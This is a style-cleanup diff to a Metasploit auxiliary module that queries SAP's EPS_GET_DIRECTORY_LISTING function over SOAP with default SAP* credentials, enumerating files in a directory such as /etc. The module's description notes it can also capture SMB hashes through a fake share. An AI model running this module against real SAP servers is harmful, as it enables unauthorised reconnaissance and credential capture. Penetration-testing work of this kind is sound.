@@ -34,15 +34,18 @@ class MetasploitModule < Msf::Auxiliary
         of entries on it. The module can also be used to capture SMB hashes by using a fake
         SMB share as DIR.
       },
-      'References' =>
-        [
-          [ 'URL', 'https://labs.f-secure.com/' ]
-        ],
-      'Author' =>
-        [
-          'nmonkee'
-        ],
-      'License' => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'https://labs.f-secure.com/' ]
+      ],
+      'Author' => [
+        'nmonkee'
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options([
@@ -50,11 +53,11 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
       OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
       OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
+      OptString.new('DIR', [true, 'Directory path (e.g. /etc)', '/etc'])
     ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
     data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
@@ -77,24 +80,24 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
           'sap-client' => datastore['CLIENT'],
           'sap-language' => 'EN'
         }
       })
-      if res and res.code == 200 and res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ and res.body =~ /<FILE_COUNTER>(\d*)<\/FILE_COUNTER>/
-        file_count = $1
-        print_good("#{rhost}:#{rport} - #{file_count} files under #{datastore["DIR"]}")
+      if res && (res.code == 200) && res.body =~ /EPS_GET_DIRECTORY_LISTING\.Response/ && res.body =~ %r{<FILE_COUNTER>(\d*)</FILE_COUNTER>}
+        file_count = ::Regexp.last_match(1)
+        print_good("#{rhost}:#{rport} - #{file_count} files under #{datastore['DIR']}")
       else
         vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s) if res
         vprint_error("#{rhost}:#{rport} - Error message: " + res.message.to_s) if res
-        vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res and res.body
+        vprint_error("#{rhost}:#{rport} - Error body: " + res.body.to_s) if res && res.body
       end
-      rescue ::Rex::ConnectionError
-        vprint_error("#{rhost}:#{rport} - Unable to connect")
-        return
-      end
+    rescue ::Rex::ConnectionError
+      vprint_error("#{rhost}:#{rport} - Unable to connect")
+      return
     end
   end
+end
